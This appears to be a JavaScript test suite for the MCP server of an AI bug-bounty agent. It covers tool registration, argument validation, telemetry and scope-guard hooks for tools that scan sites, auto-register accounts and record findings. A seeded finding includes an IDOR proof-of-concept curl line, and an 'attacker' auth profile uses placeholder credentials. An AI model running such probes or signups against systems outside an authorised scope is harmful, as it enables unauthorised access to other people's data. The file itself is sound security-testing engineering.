const test = require("node:test");
const assert = require("node:assert/strict");
const { spawnSync } = require("child_process");
const { EventEmitter } = require("events");
const Module = require("module");
const { Readable } = require("stream");
const dns = require("dns");
const fs = require("fs");
const http = require("http");
const https = require("https");
const os = require("os");
const path = require("path");
const serverModule = require("../mcp/server.js");
const {
  TOOL_HANDLERS,
} = require("../mcp/lib/dispatch.js");
const {
  buildToolRegistry,
  defineTool,
  TOOL_REGISTRY,
} = require("../mcp/lib/tool-registry.js");
const {
  TOOL_MODULES,
} = require("../mcp/lib/tools/index.js");
const {
  createMcpMessageHandler,
  createStdioServer,
} = require("../mcp/lib/transport.js");
const {
  COVERAGE_LOG_MAX_RECORDS,
  HTTP_AUDIT_LOG_MAX_RECORDS,
  STATIC_ARTIFACT_MAX_CHARS,
  TRAFFIC_IMPORT_MAX_ENTRIES,
  TRAFFIC_LOG_MAX_RECORDS,
} = require("../mcp/lib/constants.js");
const {
  appendHttpAuditRecord,
} = require("../mcp/lib/http-records.js");
const {
  acquireSessionLock,
  readSessionLockSnapshot,
  removeStaleSessionLock,
  trimJsonlFile,
} = require("../mcp/lib/storage.js");
const {
  safeFetch,
} = require("../mcp/lib/safe-fetch.js");
const {
  fetchTextWithTimeout,
} = require("../mcp/lib/public-intel.js");
const {
  normalizeAutoSignupResult,
} = require("../mcp/lib/signup.js");
const {
  agentRunSidecarPath,
  agentRunTelemetryPath,
  appendAgentRunTelemetryEvent,
  appendToolTelemetryEvent,
  buildAgentRunTelemetryEvent,
  readToolTelemetry,
  toolTelemetryPath,
} = require("../mcp/lib/tool-telemetry.js");
const {
  readResourceText,
  resolveResourcePath,
  runtimeClient,
} = require("../mcp/lib/runtime-resources.js");

const {
  TOOLS,
  TOOL_MANIFEST,
  SESSION_LOCK_STALE_MS,
  assertSafeDomain,
  validateScanUrl,
  appendJsonlLine,
  applyWaveMerge,
  attackSurfacePath,
  autoSignup,
  authStore,
  buildHeaderProfile,
  buildCircuitBreakerSummary,
  buildCoverageSummaryForSurface,
  coverageJsonlPath,
  executeTool,
  finalizeHunterRun,
  findingsJsonlPath,
  findingsMarkdownPath,
  gradeArtifactPaths,
  initSession,
  importHttpTraffic,
  logCoverage,
  migrateAuthJson,
  bountyPublicIntel,
  readScopeExclusions,
  readSessionState,
  readStateSummary,
  readCoverageRecordsFromJsonl,
  readHttpAudit,
  readHttpAuditRecordsFromJsonl,
  readPipelineAnalytics,
  readPipelineEvents,
  readSessionArtifactSummary,
  readTrafficRecordsFromJsonl,
  compactSessionState,
  listFindings,
  listAuthProfiles,
  mergeWaveHandoffs,
  httpAuditJsonlPath,
  importStaticArtifact,
  pipelineEventsJsonlPath,
  publicIntelPath,
  rankAttackSurfaces,
  readFindings,
  readGradeVerdict,
  readVerificationRound,
  readWaveHandoffs,
  recordFinding,
  redactUrlSensitiveValues,
  reportMarkdownPath,
  resolveAuthJsonPath,
  sessionDir,
  sessionLockPath,
  sessionsRoot,
  startWave,
  statePath,
  staticArtifactImportDir,
  staticArtifactPath,
  staticArtifactsJsonlPath,
  staticScan,
  staticScanResultsJsonlPath,
  tempEmail,
  transitionPhase,
  trafficJsonlPath,
  verificationRoundPaths,
  waveHandoffStatus,
  waveStatus,
  writeFileAtomic,
  writeGradeVerdict,
  writeHandoff,
  writeVerificationRound,
  writeWaveHandoff,
  filterExclusionsByHosts,
  readHunterBrief,
  readStaticArtifactRecordsFromJsonl,
  readStaticScanResultsFromJsonl,
} = serverModule;

const EXPECTED_TOOL_NAMES = [
  "bounty_http_scan",
  "bounty_read_http_audit",
  "bounty_start_wave",
  "bounty_import_http_traffic",
  "bounty_public_intel",
  "bounty_import_static_artifact",
  "bounty_static_scan",
  "bounty_record_finding",
  "bounty_read_findings",
  "bounty_list_findings",
  "bounty_write_verification_round",
  "bounty_read_verification_round",
  "bounty_write_grade_verdict",
  "bounty_read_grade_verdict",
  "bounty_init_session",
  "bounty_read_session_state",
  "bounty_transition_phase",
  "bounty_apply_wave_merge",
  "bounty_write_handoff",
  "bounty_write_wave_handoff",
  "bounty_finalize_hunter_run",
  "bounty_wave_handoff_status",
  "bounty_merge_wave_handoffs",
  "bounty_read_wave_handoffs",
  "bounty_log_dead_ends",
  "bounty_log_coverage",
  "bounty_wave_status",
  "bounty_temp_email",
  "bounty_signup_detect",
  "bounty_auth_store",
  "bounty_list_auth_profiles",
  "bounty_auto_signup",
  "bounty_read_state_summary",
  "bounty_read_hunter_brief",
  "bounty_read_tool_telemetry",
  "bounty_read_pipeline_analytics",
  "bounty_evm_call",
  "bounty_evm_storage_read",
  "bounty_evm_fetch_source",
  "bounty_evm_role_table",
  "bounty_foundry_run",
  "bounty_halmos_run",
  "bounty_svm_fetch_account",
  "bounty_svm_fetch_program",
  "bounty_anchor_run",
  "bounty_aptos_fetch_resource",
  "bounty_aptos_fetch_module",
  "bounty_aptos_run",
  "bounty_sui_fetch_object",
  "bounty_sui_fetch_package",
  "bounty_sui_run",
  "bounty_substrate_run",
  "bounty_substrate_fetch_storage",
  "bounty_substrate_fetch_runtime",
  "bounty_cosmwasm_run",
  "bounty_cosmwasm_fetch_contract",
  "bounty_cosmwasm_smart_query",
];

function withTempHome(fn) {
  const previousHome = process.env.HOME;
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
  process.env.HOME = tempHome;

  const cleanup = () => {
    if (previousHome === undefined) {
      delete process.env.HOME;
    } else {
      process.env.HOME = previousHome;
    }
    fs.rmSync(tempHome, { recursive: true, force: true });
  };

  try {
    const result = fn(tempHome);
    if (result && typeof result.then === "function") {
      return result.finally(cleanup);
    }
    cleanup();
    return result;
  } catch (error) {
    cleanup();
    throw error;
  }
}

function withEnv(overrides, fn) {
  const previous = {};
  for (const key of Object.keys(overrides)) {
    previous[key] = process.env[key];
    if (overrides[key] === undefined) {
      delete process.env[key];
    } else {
      process.env[key] = overrides[key];
    }
  }

  const cleanup = () => {
    for (const key of Object.keys(overrides)) {
      if (previous[key] === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = previous[key];
      }
    }
  };

  try {
    const result = fn();
    if (result && typeof result.then === "function") {
      return result.finally(cleanup);
    }
    cleanup();
    return result;
  } catch (error) {
    cleanup();
    throw error;
  }
}

function readJsonl(filePath) {
  if (!fs.existsSync(filePath)) return [];
  return fs.readFileSync(filePath, "utf8")
    .split(/\r?\n/)
    .filter((line) => line.trim())
    .map((line) => JSON.parse(line));
}

function seedSessionState(domain, overrides = {}) {
  const dir = sessionDir(domain);
  fs.mkdirSync(dir, { recursive: true });
  const state = {
    target: domain,
    target_url: "https://example.com",
    phase: "HUNT",
    hunt_wave: 0,
    pending_wave: null,
    total_findings: 0,
    explored: [],
    dead_ends: [],
    waf_blocked_endpoints: [],
    lead_surface_ids: [],
    scope_exclusions: [],
    hold_count: 0,
    auth_status: "pending",
    ...overrides,
  };
  writeFileAtomic(statePath(domain), `${JSON.stringify(state, null, 2)}\n`);
  return state;
}

function seedAssignments(domain, waveNumber, assignments) {
  const dir = sessionDir(domain);
  fs.mkdirSync(dir, { recursive: true });
  // Production invariant: a wave cannot start without an attack_surface.json.
  // Mirror that here so writeWaveHandoff's strict surface_type lookup succeeds.
  const surfacePath = attackSurfacePath(domain);
  if (!fs.existsSync(surfacePath)) {
    const surfaceIds = Array.from(new Set(assignments.map((a) => a.surface_id))).filter(Boolean);
    seedAttackSurface(domain, surfaceIds.length > 0 ? surfaceIds : ["surface-a"]);
  }
  // Mirror production startWave: capture surface_type from attack_surface.json
  // into the immutable assignment file. Tests that seed an SC surface get the
  // same enforcement path the runtime takes.
  const surfaceTypeById = new Map();
  try {
    const surfaceDoc = JSON.parse(fs.readFileSync(surfacePath, "utf8"));
    for (const surface of surfaceDoc.surfaces || []) {
      if (!surface || typeof surface !== "object") continue;
      const surfaceTypeRaw = typeof surface.surface_type === "string" ? surface.surface_type.trim() : "";
      surfaceTypeById.set(surface.id, surfaceTypeRaw !== "" ? surfaceTypeRaw : null);
    }
  } catch {}
  const persistedAssignments = assignments.map((assignment) => {
    const surfaceType = surfaceTypeById.get(assignment.surface_id) || null;
    return surfaceType ? { ...assignment, surface_type: surfaceType } : { ...assignment };
  });
  writeFileAtomic(path.join(dir, `wave-${waveNumber}-assignments.json`), `${JSON.stringify({
    wave_number: waveNumber,
    assignments: persistedAssignments,
  }, null, 2)}\n`);
}

function seedAttackSurface(domain, surfaceIds = ["surface-a", "surface-b", "surface-c"]) {
  const surfaces = surfaceIds.map((surfaceId) => ({
    id: surfaceId,
    hosts: [`https://${domain}`],
  }));
  writeFileAtomic(attackSurfacePath(domain), `${JSON.stringify({ surfaces }, null, 2)}\n`);
}

function seedAttackSurfaces(domain, surfaces) {
  writeFileAtomic(attackSurfacePath(domain), `${JSON.stringify({ surfaces }, null, 2)}\n`);
}

function writeUnexpectedHandoff(domain, wave, agent, payload = {}) {
  const dir = sessionDir(domain);
  fs.mkdirSync(dir, { recursive: true });
  writeFileAtomic(path.join(dir, `handoff-${wave}-${agent}.json`), `${JSON.stringify({
    target_domain: domain,
    wave,
    agent,
    surface_id: "surface-z",
    surface_status: "complete",
    dead_ends: [],
    waf_blocked_endpoints: [],
    lead_surface_ids: [],
    ...payload,
  }, null, 2)}\n`);
}

function ensureFindingAssignment(domain, wave, agent) {
  if (wave == null || agent == null) {
    return null;
  }

  const waveNumber = Number(String(wave).slice(1));
  const assignmentsPath = path.join(sessionDir(domain), `wave-${waveNumber}-assignments.json`);
  if (fs.existsSync(assignmentsPath)) {
    const assignmentDoc = JSON.parse(fs.readFileSync(assignmentsPath, "utf8"));
    const assignment = assignmentDoc.assignments.find((item) => item.agent === agent);
    return assignment ? assignment.surface_id : "surface-a";
  }

  seedAssignments(domain, waveNumber, [
    { agent, surface_id: "surface-a" },
  ]);
  return "surface-a";
}

function seedFinding(domain, overrides = {}) {
  const wave = Object.prototype.hasOwnProperty.call(overrides, "wave") ? overrides.wave : "w1";
  const agent = Object.prototype.hasOwnProperty.call(overrides, "agent") ? overrides.agent : "a1";
  const assignedSurfaceId = ensureFindingAssignment(domain, wave, agent);
  const surfaceId = Object.prototype.hasOwnProperty.call(overrides, "surface_id")
    ? overrides.surface_id
    : assignedSurfaceId;

  return JSON.parse(recordFinding({
    target_domain: domain,
    title: "IDOR on account export",
    severity: "high",
    cwe: "CWE-639",
    endpoint: "/api/export",
    description: "Authenticated user can export another account's data by changing account_id.",
    proof_of_concept: "curl https://example.com/api/export?account_id=2",
    response_evidence: "{\"account_id\":2}",
    impact: "Cross-account PII disclosure.",
    validated: true,
    wave,
    agent,
    surface_id: surfaceId,
    ...overrides,
  }));
}

function seedVerificationPipeline(domain, results) {
  for (const round of ["brutalist", "balanced", "final"]) {
    writeVerificationRound({ target_domain: domain, round, notes: null, results });
  }
}

async function withMockSafeFetch(routes, fn, { dnsRecords = {} } = {}) {
  const originalLookup = dns.lookup;
  const originalHttpRequest = http.request;
  const originalHttpsRequest = https.request;
  const requestedUrls = [];

  dns.lookup = (hostname, options, callback) => {
    const cb = typeof options === "function" ? options : callback;
    const records = dnsRecords[hostname] || [{ address: "93.184.216.34", family: 4 }];
    if (Array.isArray(records)) {
      cb(null, records);
    } else {
      cb(null, [records]);
    }
  };

  const makeRequest = (requestOptions, callback) => {
    const protocol = requestOptions.protocol || "https:";
    const host = requestOptions.hostname;
    const port = requestOptions.port ? `:${requestOptions.port}` : "";
    const requestPath = requestOptions.path || "/";
    const url = `${protocol}//${host}${port}${requestPath}`;
    requestedUrls.push(url);

    const req = new EventEmitter();
    req.write = () => {};
    req.setTimeout = () => req;
    req.destroy = (error) => {
      if (error) process.nextTick(() => req.emit("error", error));
    };
    req.end = () => {
      process.nextTick(() => {
        if (typeof requestOptions.lookup === "function") {
          let lookupFailed = null;
          requestOptions.lookup(host, { all: true }, (error, addresses) => {
            if (error) {
              lookupFailed = error;
              return;
            }
            if (!Array.isArray(addresses) || !addresses[0] || !addresses[0].address) {
              lookupFailed = new Error("mock lookup all mode did not return address records");
            }
          });
          if (lookupFailed) {
            req.emit("error", lookupFailed);
            return;
          }
        }

        const route = typeof routes === "function" ? routes(url, requestOptions) : routes[url];
        if (!route) {
          req.emit("error", new Error(`No mock route for ${url}`));
          return;
        }
        if (route.error) {
          req.emit("error", route.error);
          return;
        }

        const body = Buffer.isBuffer(route.body)
          ? route.body
          : Buffer.from(route.body == null ? "" : String(route.body));
        const res = Readable.from([body]);
        res.statusCode = route.status || 200;
        res.statusMessage = route.statusText || "OK";
        res.headers = route.headers || { "content-type": "text/plain" };
        callback(res);
      });
    };
    return req;
  };

  http.request = makeRequest;
  https.request = makeRequest;

  try {
    return await fn(requestedUrls);
  } finally {
    dns.lookup = originalLookup;
    http.request = originalHttpRequest;
    https.request = originalHttpsRequest;
  }
}

function runScopeGuard(command, { home, env = {} }) {
  return spawnSync("bash", [path.join(__dirname, "..", ".claude", "hooks", "scope-guard.sh")], {
    input: JSON.stringify({ tool_input: { command } }),
    encoding: "utf8",
    env: { ...process.env, HOME: home, ...env },
  });
}

function runMcpScopeGuard(toolInput, { home, env = {} }) {
  return spawnSync("bash", [path.join(__dirname, "..", ".claude", "hooks", "scope-guard-mcp.sh")], {
    input: JSON.stringify({ tool_input: toolInput }),
    encoding: "utf8",
    env: { ...process.env, HOME: home, ...env },
  });
}

function runHunterSubagentStop(payload, { home, env = {} }) {
  return spawnSync(process.execPath, [path.join(__dirname, "..", ".claude", "hooks", "hunter-subagent-stop.js")], {
    input: JSON.stringify(payload),
    encoding: "utf8",
    env: { ...process.env, HOME: home, CLAUDE_PROJECT_DIR: path.join(__dirname, ".."), ...env },
  });
}

test("mcp server public exports remain stable", () => {
  assert.deepEqual(Object.keys(serverModule).sort(), [
    "SESSION_LOCK_STALE_MS",
    "TOOLS",
    "TOOL_MANIFEST",
    "appendJsonlLine",
    "applyWaveMerge",
    "assertSafeDomain",
    "attackSurfacePath",
    "authStore",
    "autoSignup",
    "bountyPublicIntel",
    "buildCircuitBreakerSummary",
    "buildCoverageSummaryForSurface",
    "buildHeaderProfile",
    "compactSessionState",
    "computeCoverageRequeueSurfaceIds",
    "coverageJsonlPath",
    "executeTool",
    "filterExclusionsByHosts",
    "finalizeHunterRun",
    "findingsJsonlPath",
    "findingsMarkdownPath",
    "gradeArtifactPaths",
    "httpAuditJsonlPath",
    "importHttpTraffic",
    "importStaticArtifact",
    "initSession",
    "listAuthProfiles",
    "listFindings",
    "logCoverage",
    "mergeWaveHandoffs",
    "migrateAuthJson",
    "normalizeCoverageRecord",
    "normalizeFindingRecord",
    "normalizeGradeVerdictDocument",
    "normalizeHttpAuditRecord",
    "normalizeSessionStateDocument",
    "normalizeStringArray",
    "normalizeTrafficRecord",
    "pipelineEventsJsonlPath",
    "publicIntelPath",
    "rankAttackSurfaces",
    "readAuthJson",
    "readCoverageRecordsFromJsonl",
    "readFindings",
    "readFindingsFromJsonl",
    "readGradeVerdict",
    "readHttpAudit",
    "readHttpAuditRecordsFromJsonl",
    "readHunterBrief",
    "readPipelineAnalytics",
    "readPipelineEvents",
    "readScopeExclusions",
    "readSessionArtifactSummary",
    "readSessionState",
    "readStateSummary",
    "readStaticArtifactRecordsFromJsonl",
    "readStaticScanResultsFromJsonl",
    "readTrafficRecordsFromJsonl",
    "readVerificationRound",
    "readWaveHandoffs",
    "recordFinding",
    "redactUrlSensitiveValues",
    "renderFindingMarkdownEntry",
    "renderGradeVerdictMarkdown",
    "renderVerificationRoundMarkdown",
    "reportMarkdownPath",
    "resolveAuthJsonPath",
    "resolveHunterKnowledge",
    "sessionDir",
    "sessionLockPath",
    "sessionsRoot",
    "signupDetect",
    "startServer",
    "startWave",
    "statePath",
    "staticArtifactImportDir",
    "staticArtifactPath",
    "staticArtifactsJsonlPath",
    "staticScan",
    "staticScanResultsJsonlPath",
    "summarizeFindings",
    "summarizeStaticScanHints",
    "tempEmail",
    "trafficJsonlPath",
    "transitionPhase",
    "validateScanUrl",
    "verificationRoundPaths",
    "waveHandoffStatus",
    "waveStatus",
    "writeFileAtomic",
    "writeGradeVerdict",
    "writeHandoff",
    "writeVerificationRound",
    "writeWaveHandoff",
  ]);
});

test("MCP tool registry and dispatch cases stay in sync", async () => {
  const toolNames = TOOLS.map((tool) => tool.name);
  assert.deepEqual(toolNames, EXPECTED_TOOL_NAMES);
  assert.deepEqual(TOOL_REGISTRY.map((tool) => tool.name), EXPECTED_TOOL_NAMES);
  assert.deepEqual(TOOL_MODULES.map((tool) => defineTool(tool).name), EXPECTED_TOOL_NAMES);
  assert.deepEqual([...toolNames].sort(), [...new Set(toolNames)].sort(), "tool names must be unique");
  assert.ok(toolNames.every((name) => name.startsWith("bounty_")));
  assert.ok(!toolNames.includes("bounty_auth_manual"));
  assert.ok(!toolNames.includes("bounty_read_handoff"));
  assert.equal(
    TOOLS.find((tool) => tool.name === "bounty_static_scan").inputSchema.properties.artifact_id.pattern,
    "^SA-[1-9][0-9]*$",
  );

  const dispatchNames = Object.keys(TOOL_HANDLERS);

  assert.deepEqual(dispatchNames, toolNames);
  assert.deepEqual(Object.keys(TOOL_MANIFEST), toolNames);
  for (const tool of TOOL_REGISTRY) {
    assert.equal(TOOL_HANDLERS[tool.name], tool.handler);
    assert.equal(TOOLS.find((item) => item.name === tool.name).inputSchema, tool.inputSchema);
  }
  await withTempHome(async () => {
    assert.deepEqual(await executeTool("__unknown_tool__", {}), {
      ok: false,
      error: { code: "UNKNOWN_TOOL", message: "Unknown tool: __unknown_tool__" },
      meta: { tool: "__unknown_tool__", version: 1 },
    });
  });
});

test("MCP tool manifest exposes required policy metadata for every tool", () => {
  for (const tool of TOOLS) {
    const metadata = TOOL_MANIFEST[tool.name];
    assert.ok(metadata, `${tool.name} missing manifest metadata`);
    assert.ok(Array.isArray(metadata.role_bundles) && metadata.role_bundles.length > 0);
    assert.equal(typeof metadata.mutating, "boolean");
    assert.equal(typeof metadata.global_preapproval, "boolean");
    assert.equal(typeof metadata.network_access, "boolean");
    assert.equal(typeof metadata.browser_access, "boolean");
    assert.equal(typeof metadata.scope_required, "boolean");
    assert.equal(typeof metadata.sensitive_output, "boolean");
    assert.ok(Array.isArray(metadata.session_artifacts_written));
    assert.equal(typeof metadata.hook_required, "boolean");
  }
});

test("MCP per-tool modules preserve representative tool behavior", () => {
  const byName = new Map(TOOLS.map((tool) => [tool.name, tool]));
  assert.equal(byName.get("bounty_read_http_audit").inputSchema.required[0], "target_domain");
  assert.equal(byName.get("bounty_start_wave").inputSchema.properties.assignments.type, "array");
  assert.equal(byName.get("bounty_http_scan").inputSchema.properties.url.type, "string");
  assert.deepEqual(byName.get("bounty_http_scan").inputSchema.required, ["method", "url", "target_domain"]);
  assert.equal(TOOL_MANIFEST.bounty_read_http_audit.mutating, false);
  assert.equal(TOOL_MANIFEST.bounty_start_wave.mutating, true);
  assert.equal(TOOL_MANIFEST.bounty_start_wave.global_preapproval, false);
  assert.equal(TOOL_MANIFEST.bounty_http_scan.network_access, true);
  assert.equal(TOOL_MANIFEST.bounty_http_scan.global_preapproval, true);
  assert.equal(TOOL_MANIFEST.bounty_http_scan.scope_required, true);
  assert.equal(TOOL_MANIFEST.bounty_http_scan.hook_required, true);
  assert.equal(TOOL_MANIFEST.bounty_read_tool_telemetry.mutating, false);
  assert.equal(TOOL_MANIFEST.bounty_read_tool_telemetry.global_preapproval, false);
  assert.deepEqual(TOOL_MANIFEST.bounty_read_tool_telemetry.role_bundles, ["orchestrator"]);
  assert.equal(TOOL_MANIFEST.bounty_read_pipeline_analytics.mutating, false);
  assert.equal(TOOL_MANIFEST.bounty_read_pipeline_analytics.global_preapproval, false);
  assert.deepEqual(TOOL_MANIFEST.bounty_read_pipeline_analytics.role_bundles, ["orchestrator"]);
  assert.equal(TOOL_MANIFEST.bounty_finalize_hunter_run.mutating, true);
  assert.equal(TOOL_MANIFEST.bounty_finalize_hunter_run.global_preapproval, true);
  assert.deepEqual(TOOL_MANIFEST.bounty_finalize_hunter_run.role_bundles, ["hunter"]);
});

test("MCP tool registry validation rejects incomplete or inconsistent entries", () => {
  const completeModule = {
    name: "bounty_test_tool",
    description: "Test tool.",
    inputSchema: { type: "object", properties: {} },
    handler: () => ({}),
    role_bundles: ["hunter"],
    mutating: false,
    global_preapproval: true,
    network_access: false,
    browser_access: false,
    scope_required: false,
    sensitive_output: false,
    session_artifacts_written: [],
    hook_required: false,
  };

  assert.throws(
    () => buildToolRegistry({
      toolModules: [completeModule, { ...completeModule }],
    }),
    /Duplicate tool name/,
  );

  assert.throws(
    () => buildToolRegistry({
      toolModules: [{ ...completeModule, handler: undefined }],
    }),
    /has no handler/,
  );

  const missingGlobalPreapproval = { ...completeModule };
  delete missingGlobalPreapproval.global_preapproval;
  assert.throws(
    () => buildToolRegistry({
      toolModules: [missingGlobalPreapproval],
    }),
    /missing global_preapproval/,
  );

  assert.throws(
    () => buildToolRegistry({
      toolModules: [{ ...completeModule, global_preapproval: "yes" }],
    }),
    /invalid global_preapproval/,
  );

  assert.throws(
    () => buildToolRegistry({
      toolModules: [{ ...completeModule, role_bundles: ["mystery"] }],
    }),
    /unknown role bundle mystery/,
  );
});

test("MCP runtime no longer imports legacy split tool definition files", () => {
  const mcpRoot = path.join(__dirname, "..", "mcp");
  const forbiddenFiles = [
    path.join(mcpRoot, "lib", "tool-definitions.js"),
    path.join(mcpRoot, "lib", "tool-manifest.js"),
    path.join(mcpRoot, "lib", "tool-handlers.js"),
  ];
  for (const filePath of forbiddenFiles) {
    assert.equal(fs.existsSync(filePath), false, `${path.basename(filePath)} should be removed`);
  }

  const jsFiles = [];
  const walk = (dir) => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const entryPath = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        walk(entryPath);
      } else if (entry.isFile() && entry.name.endsWith(".js")) {
        jsFiles.push(entryPath);
      }
    }
  };
  walk(mcpRoot);

  for (const filePath of jsFiles) {
    const content = fs.readFileSync(filePath, "utf8");
    assert.equal(content.includes("tool-definitions.js"), false, `${filePath} imports legacy definitions`);
    assert.equal(content.includes("tool-manifest.js"), false, `${filePath} imports legacy manifest`);
    assert.equal(content.includes("tool-handlers.js"), false, `${filePath} imports legacy handlers`);
  }
});

test("executeTool rejects unknown top-level arguments while allowing nested map-like fields", async () => {
  await withTempHome(async () => {
    const unknown = await executeTool("bounty_http_scan", {
      method: "GET",
      url: "https://example.com/",
      target_domain: "example.com",
      surprise: true,
    });
    assert.equal(unknown.ok, false);
    assert.equal(unknown.error.code, "INVALID_ARGUMENTS");
    assert.match(unknown.error.message, /surprise is not allowed/);

    const traffic = await executeTool("bounty_import_http_traffic", {
      target_domain: "example.com",
      source: "har",
      entries: [{
        request: {
          method: "GET",
          url: "https://example.com/api",
          headers: [{ name: "X-Test", value: "1", arbitrary_har_field: "kept" }],
        },
        response: { status: 200, nested_har_field: true },
      }],
    });
    assert.equal(traffic.ok, true);
    assert.equal(traffic.data.imported, 1);

    const auth = await executeTool("bounty_auth_store", {
      target_domain: "example.com",
      profile_name: "attacker",
      headers: { "X-Custom": "ok" },
      cookies: { session: "abc" },
      local_storage: { access_token: "eyJabc" },
    });
    assert.equal(auth.ok, true);
    assert.equal(auth.data.success, true);
  });
});

test("executeTool returns standard envelopes and recursively validates schema arguments", async () => {
  await withTempHome(async () => {
    const unknown = await executeTool("__unknown_tool__", {});
    assert.deepEqual(unknown, {
      ok: false,
      error: { code: "UNKNOWN_TOOL", message: "Unknown tool: __unknown_tool__" },
      meta: { tool: "__unknown_tool__", version: 1 },
    });

    const missingTargetDomain = await executeTool("bounty_http_scan", {
      method: "GET",
      url: "https://example.com/",
    });
    assert.equal(missingTargetDomain.ok, false);
    assert.equal(missingTargetDomain.error.code, "INVALID_ARGUMENTS");
    assert.match(missingTargetDomain.error.message, /target_domain is required/);

    const nested = await executeTool("bounty_auth_store", {
      target_domain: "example.com",
      profile_name: "attacker",
      credentials: {
        email: "a@example.com",
        password: "secret",
        unexpected: true,
      },
    });
    assert.equal(nested.ok, false);
    assert.equal(nested.error.code, "INVALID_ARGUMENTS");
    assert.match(nested.error.message, /credentials\.unexpected is not allowed/);

    const badWave = await executeTool("bounty_log_coverage", {
      target_domain: "example.com",
      wave: "1",
      agent: "a1",
      surface_id: "surface-a",
      entries: [],
    });
    assert.equal(badWave.ok, false);
    assert.equal(badWave.error.code, "INVALID_ARGUMENTS");
    assert.match(badWave.error.message, /wave must match pattern \^w\[1-9\]\[0-9\]\*\$/);

    const zeroWave = await executeTool("bounty_log_coverage", {
      target_domain: "example.com",
      wave: "w0",
      agent: "a1",
      surface_id: "surface-a",
      entries: [],
    });
    assert.equal(zeroWave.ok, false);
    assert.equal(zeroWave.error.code, "INVALID_ARGUMENTS");
    assert.match(zeroWave.error.message, /wave must match pattern \^w\[1-9\]\[0-9\]\*\$/);

    const zeroAgent = await executeTool("bounty_start_wave", {
      target_domain: "example.com",
      wave_number: 1,
      assignments: [{ agent: "a0", surface_id: "surface-a" }],
    });
    assert.equal(zeroAgent.ok, false);
    assert.equal(zeroAgent.error.code, "INVALID_ARGUMENTS");
    assert.match(zeroAgent.error.message, /assignments\[0\]\.agent must match pattern \^a\[1-9\]\[0-9\]\*\$/);

    const badEntries = await executeTool("bounty_log_coverage", {
      target_domain: "example.com",
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries: "not-array",
    });
    assert.equal(badEntries.ok, false);
    assert.equal(badEntries.error.code, "INVALID_ARGUMENTS");
    assert.match(badEntries.error.message, /entries must be array/);

    const traffic = await executeTool("bounty_import_http_traffic", {
      target_domain: "example.com",
      source: "har",
      entries: [{
        request: {
          method: "GET",
          url: "https://example.com/api",
          headers: [{ name: "X-Test", value: "1", arbitrary_har_field: "kept" }],
        },
        response: { status: 200, nested_har_field: true },
      }],
    });
    assert.equal(traffic.ok, true);
    assert.equal(traffic.data.imported, 1);
  });
});

test("executeTool writes telemetry rows for success and dispatcher failure modes", async () => {
  await withTempHome(async () => {
    await withEnv({ BOUNTY_TELEMETRY: undefined, BOUNTY_TELEMETRY_DIR: undefined }, async () => {
      const success = await executeTool("bounty_list_auth_profiles", { target_domain: "example.com" });
      assert.equal(success.ok, true);

      const unknown = await executeTool("__unknown_tool__", {});
      assert.equal(unknown.error.code, "UNKNOWN_TOOL");

      const invalid = await executeTool("bounty_log_coverage", {
        target_domain: "example.com",
        wave: "w1",
        agent: "a1",
        surface_id: "surface-a",
        entries: "not-array",
      });
      assert.equal(invalid.error.code, "INVALID_ARGUMENTS");

      const thrown = await executeTool("bounty_read_session_state", { target_domain: "missing.example" });
      assert.equal(thrown.error.code, "NOT_FOUND");

      const blocked = await executeTool("bounty_http_scan", {
        method: "GET",
        url: "http://127.0.0.1/",
        target_domain: "example.com",
        block_internal_hosts: true,
      });
      assert.equal(blocked.error.code, "SCOPE_BLOCKED");

      const rows = readJsonl(toolTelemetryPath());
      assert.equal(rows.length, 5);

      assert.equal(rows[0].tool, "bounty_list_auth_profiles");
      assert.equal(rows[0].ok, true);
      assert.equal(rows[0].error_code, null);
      assert.equal(rows[0].target_domain, "example.com");
      assert.equal(rows[0].registry.global_preapproval, true);
      assert.equal(rows[0].registry.mutating, false);
      assert.equal(typeof rows[0].elapsed_ms, "number");

      assert.equal(rows[1].tool, "__unknown_tool__");
      assert.equal(rows[1].ok, false);
      assert.equal(rows[1].error_code, "UNKNOWN_TOOL");
      assert.equal(rows[1].registry, null);
      assert.equal(rows[1].error_message, "Unknown tool");

      assert.equal(rows[2].tool, "bounty_log_coverage");
      assert.equal(rows[2].error_code, "INVALID_ARGUMENTS");
      assert.equal(rows[2].wave, "w1");
      assert.equal(rows[2].agent, "a1");
      assert.equal(rows[2].surface_id, "surface-a");
      assert.match(rows[2].error_message, /entries must be array/);

      assert.equal(rows[3].tool, "bounty_read_session_state");
      assert.equal(rows[3].error_code, "NOT_FOUND");
      assert.match(rows[3].error_message, /Missing session state/);

      assert.equal(rows[4].tool, "bounty_http_scan");
      assert.equal(rows[4].error_code, "SCOPE_BLOCKED");
      assert.equal(rows[4].target_domain, "example.com");
      assert.equal(rows[4].registry.sensitive_output, true);
      assert.equal(Object.prototype.hasOwnProperty.call(rows[4], "error_message"), false);
    });
  });
});

test("tool telemetry can be disabled and writer failures never change envelopes", async () => {
  await withTempHome(async () => {
    await withEnv({ BOUNTY_TELEMETRY: "0", BOUNTY_TELEMETRY_DIR: undefined }, async () => {
      const result = await executeTool("bounty_list_auth_profiles", { target_domain: "example.com" });
      assert.equal(result.ok, true);
      assert.equal(fs.existsSync(toolTelemetryPath()), false);
    });
  });

  await withTempHome(async () => {
    const blockingPath = path.join(os.tmpdir(), `bountyagent-telemetry-block-${process.pid}-${Date.now()}`);
    fs.writeFileSync(blockingPath, "not a directory\n");
    try {
      await withEnv({ BOUNTY_TELEMETRY: undefined, BOUNTY_TELEMETRY_DIR: blockingPath }, async () => {
        const result = await executeTool("bounty_list_auth_profiles", { target_domain: "example.com" });
        assert.equal(result.ok, true);
        assert.equal(result.data.version, 1);
        assert.equal(result.data.target_domain, "example.com");
        assert.deepEqual(result.data.profiles, []);
        assert.deepEqual(result.meta, { tool: "bounty_list_auth_profiles", version: 1 });
      });
    } finally {
      fs.rmSync(blockingPath, { force: true });
    }
  });
});

test("tool telemetry rows do not store raw secret-bearing payloads", async () => {
  await withTempHome(async () => {
    await withEnv({ BOUNTY_TELEMETRY: undefined, BOUNTY_TELEMETRY_DIR: undefined }, async () => {
      seedSessionState("example.com");

      const authFailure = await executeTool("bounty_auth_store", {
        target_domain: "example.com",
        profile_name: "attacker",
        credentials: {
          email: "a@example.com",
          password: "super-secret-password",
          unexpected: true,
        },
      });
